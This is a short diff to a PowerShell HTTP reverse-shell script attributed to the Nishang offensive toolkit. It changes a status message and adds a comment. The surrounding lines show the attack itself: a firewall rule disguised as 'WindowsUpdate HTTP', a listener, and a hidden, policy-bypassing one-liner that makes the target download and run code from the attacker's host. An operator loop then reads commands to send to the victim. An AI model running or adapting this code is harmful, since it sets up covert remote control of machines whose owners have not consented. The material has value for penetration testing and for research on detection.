@@ -71,7 +71,7 @@ https://github.com/samratashok/nishang
         netsh advfirewall firewall add rule name="WindowsUpdate HTTP" dir=in action=allow protocol=TCP localport=$Port | Out-Null
 
         $listener.Start()
-        Write-Output "Listening on $Port"
+        Write-Output "Listening on $IPAddress`:$Port"
         Write-Output "Run the following command on the target:"
         Write-Output "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://$IPAddress`:$Port/connect'))"
 
@@ -110,6 +110,7 @@ https://github.com/samratashok/nishang
             {  
                 $response.ContentType = 'text/plain'
                 $message = Read-Host "PS $hostip>"		
+                #If the Server/Attacker uses the exit command. Close the client part and the server.
                 if ($message -eq "exit")
                 {
                     [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
